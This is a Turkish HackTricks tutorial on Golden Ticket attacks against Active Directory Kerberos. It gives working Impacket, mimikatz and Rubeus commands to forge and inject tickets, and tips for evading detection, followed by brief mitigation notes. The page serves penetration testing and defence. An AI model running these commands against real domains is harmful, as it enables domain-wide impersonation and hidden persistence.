# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Bir **Golden Ticket** saldırısı, **NTLM hash'ini kullanarak herhangi bir kullanıcıyı taklit eden meşru bir Ticket Granting Ticket (TGT) oluşturma** işleminden oluşur. Bu teknik, taklit edilen kullanıcı olarak **alan içindeki herhangi bir hizmete veya makineye erişim sağladığı** için özellikle avantajlıdır. **krbtgt hesabının kimlik bilgileri asla otomatik olarak güncellenmez** olduğunu hatırlamak önemlidir.

**krbtgt hesabının NTLM hash'ini elde etmek** için çeşitli yöntemler kullanılabilir. Bu hash, alan içindeki herhangi bir Domain Controller (DC) üzerindeki **Local Security Authority Subsystem Service (LSASS) sürecinden** veya **NT Directory Services (NTDS.dit) dosyasından** çıkarılabilir. Ayrıca, bu NTLM hash'ini elde etmek için **DCsync saldırısı gerçekleştirmek** de başka bir stratejidir; bu, Mimikatz'taki **lsadump::dcsync modülü** veya Impacket tarafından sağlanan **secretsdump.py scripti** gibi araçlar kullanılarak yapılabilir. Bu işlemleri gerçekleştirmek için genellikle **alan yöneticisi ayrıcalıkları veya benzer bir erişim seviyesi gereklidir**.

NTLM hash'i bu amaç için geçerli bir yöntem olsa da, operasyonel güvenlik nedenleriyle **Gelişmiş Şifreleme Standardı (AES) Kerberos anahtarlarını (AES128 ve AES256)** kullanarak biletlerin **sahte belgelenmesi** şiddetle tavsiye edilir.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
**Bir kez** **golden Ticket** enjekte edildiğinde, paylaşılan dosyalara **(C$)** erişebilir ve hizmetleri ve WMI'yi çalıştırabilirsiniz, bu nedenle bir shell elde etmek için **psexec** veya **wmiexec** kullanabilirsiniz (winrm üzerinden bir shell elde edemediğiniz görünüyor).

### Yaygın tespitleri atlatma

Golden ticket'ı tespit etmenin en yaygın yolları, kablolu ağda **Kerberos trafiğini incelemektir**. Varsayılan olarak, Mimikatz **TGT'yi 10 yıl boyunca imzalar**, bu da onunla yapılan sonraki TGS isteklerinde anormal olarak öne çıkacaktır.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Başlangıç ofsetini, süreyi ve maksimum yenilemeleri kontrol etmek için `/startoffset`, `/endin` ve `/renewmax` parametrelerini kullanın (hepsi dakikalar cinsindendir).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Maalesef, TGT'nin ömrü 4769'da kaydedilmediği için bu bilgiyi Windows olay günlüklerinde bulamazsınız. Ancak, **önceki 4768 olmadan 4769 görmek** ile ilişkilendirebilirsiniz. **TGT olmadan TGS talep etmek mümkün değildir** ve eğer bir TGT'nin verildiğine dair bir kayıt yoksa, bunun çevrimdışı olarak sahte olduğu sonucuna varabiliriz.

Bu **tespit bypass'ını** gerçekleştirmek için elmas biletlerini kontrol edin:

{{#ref}}
diamond-ticket.md
{{#endref}}

### Mitigasyon

- 4624: Hesap Girişi
- 4672: Yönetici Girişi
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Savunucuların yapabileceği diğer küçük numaralar, **varsayılan etki alanı yöneticisi hesabı gibi hassas kullanıcılar için 4769'da uyarı vermektir**.

## Referanslar

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}
